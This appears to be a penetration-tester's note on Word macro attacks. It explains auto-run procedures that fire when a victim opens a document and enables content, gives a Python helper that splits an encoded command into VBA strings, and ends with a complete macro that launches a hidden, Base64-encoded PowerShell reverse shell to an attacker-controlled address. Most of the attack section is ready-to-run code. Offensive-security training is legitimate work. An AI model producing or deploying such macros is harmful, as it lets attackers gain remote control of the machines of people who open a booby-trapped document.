# Office Macros

Installation: Use [this link](https://officecdn.microsoft.com/db/492350F6-3A01-4F97-B9C0-C7C6DDF67D60/media/en-US/ProPlus2019Retail.img) to install microsoft word with a free trial by clicking the `x` when asked to enter a product key.

## Fundamentals

Macros are written in Visual Basic for Applications (VBA)

First we need to create a new word file and save it in the `.doc` format. This is because the newer `.docx` file type cannot save macros without attaching a containing template. `.docm` also works.

Find macros menu under `View -> Macros`

![](Attachments/a53145a35ae8a3b5ec898c0412736712-csa_macro_view2.png)

We can now create a new macro called `MyMacro`, making sure to set the location to within the current document.

![](Attachments/af16daddd29d2bff910e99977a3ddc68-csa_macro_macrocreate2.png)

The following example is a proof of concept. `AutoOpen()` and `Document_Open()` are both procedures that can call our custom procedure and run our code when our word document is opened. They differ slightly depending on the manner in which the document is opened and both cover special cases which the other one doesn't and therefore we use both.

```vb
Sub AutoOpen()
	MyMacro
End Sub

Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
    CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

The victim must click `Enable Content` in order to trigger the macro.

In order to create a reverse shell we can use the `PowerShell #3 (Base64)` reverse shell from [revshells](https://www.revshells.com/). More details can be found [here](../../11%20Windows/Windows%20Shells.md).

In order to create the payload for us to paste into visual basic, we can use the following python script

```python
str = "powershell.exe -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4A..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA"
    Str = Str + "D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0"
    Str = Str + "ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa"
    Str = Str + "QBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADgAIgA"
    Str = Str + "sADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjA"
    Str = Str + "GwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFs"
    Str = Str + "AYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4AL"
    Str = Str + "gA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAA"
    Str = Str + "kAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkA"
    Str = Str + "GIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGU"
    Str = Str + "AbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAd"
    Str = Str + "ABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB"
    Str = Str + "5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0A"
    Str = Str + "C4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQ"
    Str = Str + "AUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAa"
    Str = Str + "QApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAA"
    Str = Str + "gACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTA"
    Str = Str + "HQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACA"
    Str = Str + "APQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAI"
    Str = Str + "gAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgA"
    Str = Str + "gACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlA"
    Str = Str + "HgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEk"
    Str = Str + "AKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAY"
    Str = Str + "wBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAA"
    Str = Str + "kAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5A"
    Str = Str + "HQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4"
    Str = Str + "ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAb"
    Str = Str + "ABvAHMAZQAoACkA"
    
    CreateObject("Wscript.Shell").Run Str
End Sub
```

